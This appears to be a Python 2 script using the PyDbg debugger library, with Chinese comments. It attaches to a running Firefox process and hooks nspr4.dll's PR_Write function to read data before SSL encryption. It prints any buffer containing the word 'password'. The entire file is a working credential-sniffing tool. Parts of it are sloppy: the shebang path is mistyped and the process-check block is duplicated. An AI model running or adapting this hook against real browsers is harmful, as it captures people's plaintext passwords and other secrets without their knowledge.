#!/ur/bin/env python 
from pydbg import * 
from pydbg.defines import * 
     
import utils 
import sys 
     
dbg = pydbg() 
found_firefox = False 
     
pattern = "password" 
     
     
def ssl_sniff( dbg, args ): 
    buffer = "" 
    offset = 0 
    while 1: 
        byte = dbg.read_process_memory( args[1] + offset, 1 ) 
        if byte != "\x00": 
            buffer += byte 
            offset += 1 
            continue 
        else: 
            break 
    if pattern in buffer: 
        print "Pre-Encrypted: %s" % buffer 
    return DBG_CONTINUE 
    # 寻找firefox.exe的进程 
for (pid, name) in dbg.enumerate_processes(): 
    if name.lower() == "firefox.exe": 
        found_firefox = True 
        hooks = utils.hook_container() 
        dbg.attach(pid) 
        print "[*] Attaching to firefox.exe with PID: %d" % pid 
# 得到firefox的hook的 address 
        hook_address = dbg.func_resolve_debuggee("nspr4.dll","PR_Write") 
        if hook_address: 
# 添加hook的内容，包括他的pid，地址，嗅探类型
     
            hooks.add( dbg, hook_address, 2, ssl_sniff, None ) 
            print "[*] nspr4.PR_Write hooked at: 0x%08x" % hook_address 
            break 
        else: 
            print "[*] Error: Couldn't resolve hook address." 
            sys.exit(-1) 
        if found_firefox: 
            print "[*] Hooks set, continuing process." 
            dbg.run() 
        else: 
                print "[*] Error: Couldn't find the firefox.exe process." 
                sys.exit(-1) 
                     
if found_firefox: 
    print "[*] Hooks set, continuing process." 
    dbg.run() 
else: 
    print "[*] Error: Couldn't find the firefox.exe process." 
    sys.exit(-1) 
